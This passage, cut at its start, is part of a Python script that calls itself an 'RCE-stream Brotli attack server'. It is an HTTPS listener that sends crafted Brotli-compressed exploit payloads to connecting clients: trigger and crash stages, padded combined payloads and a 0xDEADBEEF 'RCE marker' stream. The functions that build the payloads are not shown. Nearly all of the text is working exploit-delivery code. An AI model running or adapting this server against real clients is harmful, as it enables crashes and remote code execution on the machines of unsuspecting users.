                    stage2 = stage2_crash

            payload = trigger + (b"\x00" * pad_len) + stage2
            print(f"  -> COMBINED (legacy): trigger={len(trigger)}B + {pad_len}pad + stage2={len(stage2)}B = {len(payload)}B")
            _send_br_response(ssl_sock, payload)

        elif path == "/br/small":
            trigger = craft_trigger(40000)
            print(f"  -> SINGLE-SHOT: {len(trigger)}B")
            _send_br_response(ssl_sock, trigger)

        elif path == "/raw/stage1":
            _send_raw(ssl_sock, stage1, "stage1.bin")

        elif path == "/raw/stage2-crash":
            _send_raw(ssl_sock, stage2_crash, "stage2-crash.bin")

        elif path == "/raw/rce-marker":
            prefix = bytearray(1024)
            for i in range(0, 1024, 4):
                struct.pack_into("<I", prefix, i, 0xDEADBEEF)
            rce_data = build_rce_stream(bytes(prefix))
            _send_raw(ssl_sock, rce_data, "rce-marker.bin")

        else:
            body = b"404 Not Found\n"
            ssl_sock.sendall(
                b"HTTP/1.1 404 Not Found\r\n"
                b"Content-Type: text/plain\r\n"
                + f"Content-Length: {len(body)}\r\n".encode()
                + b"Connection: close\r\n\r\n"
                + body
            )

    except (ssl.SSLError, OSError, BrokenPipeError) as e:
        print(f"  -> Connection error: {e}")
    finally:
        try:
            ssl_sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        ssl_sock.close()


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4447
    cert_dir = os.path.dirname(os.path.abspath(__file__))

    certfile, keyfile = ensure_cert(cert_dir)
    ssl_ctx = create_ssl_context(certfile, keyfile)

    print("Generating stage 1 (trigger, 40000 commands)...")
    stage1 = build_stage1(40000)
    print(f"  Stage 1 ready: {len(stage1)} bytes")
    print(f"  SHA256: {hashlib.sha256(stage1).hexdigest()}")

    stage2_crash = build_stage2_crash()
    print(f"  Stage 2 (crash): {len(stage2_crash)} bytes")
    print(f"  Stage 2 hex[0:28]: {stage2_crash[:28].hex()}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(64)

    print(f"\nRCE-stream Brotli attack server running on https://0.0.0.0:{port}/")
    print(f"Landing page: https://192.168.1.155:{port}/")
    print(f"RCE marker: https://192.168.1.155:{port}/rce/marker")
    print(f"RCE ASCII:  https://192.168.1.155:{port}/rce/ascii")
    print(f"Reference:  https://192.168.1.155:{port}/br/small")
    print("Waiting for connections...\n")
    print("NOTE: RCE streams are ~23MB (16M commands). First request may take time to generate.")

    while True:
        try:
            client_sock, addr = sock.accept()
            try:
                ssl_sock = ssl_ctx.wrap_socket(client_sock, server_side=True)
            except ssl.SSLError as e:
                print(f"[{addr[0]}] SSL handshake failed: {e}")
                client_sock.close()
                continue

            t = threading.Thread(target=handle_client,
                                 args=(ssl_sock, addr, stage1, stage2_crash),
                                 daemon=True)
            t.start()
        except KeyboardInterrupt:
            print("\nShutting down...")
            break

    sock.close()


if __name__ == "__main__":
    main()
